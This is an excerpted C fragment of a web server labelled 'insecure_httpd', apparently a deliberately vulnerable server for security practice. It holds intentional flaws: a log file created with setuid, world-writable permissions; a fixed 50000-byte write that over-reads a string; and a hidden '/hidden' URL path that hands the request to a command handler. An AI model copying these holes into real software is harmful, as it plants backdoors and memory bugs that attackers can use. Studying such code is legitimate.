...
#define DEFAULT_CERTFILE "insecure_httpd.pem"
...
static size_t request_size, request_idx; 
static unsigned char request_len; 
static int method;
static char* path;
static char* file;
...
printLog( char* str )
{
    ...
    umask( 0 );
    int fd = open("log.txt", O_CREAT | O_RDWR, 4777);
    write( fd, str, 50000 );
    close( fd ); 
}
...
handle_request( void )
    ...
    *path++ = '\0';
    ...
    printLog( path );
    if ( strncasecmp( path, "/hidden", 7 ) == 0 ){
        hiddenCmd( path ); 
        /* do_file(); 
	goto got_one; */
    }

    if ( strncasecmp( path, "/desmain", 8 ) == 0 ){
        desmain();
        do_file();  
	goto got_one;
    }

    if ( strncasecmp( path, "/dbmain", 7 ) == 0 ){
        dbinvoke();  
        do_file();
	goto got_one;
    }

    if ( strncasecmp( path, "/startchatsvr", 13 ) == 0 ){
        chatserver();
        do_file();
	goto got_one;
    }
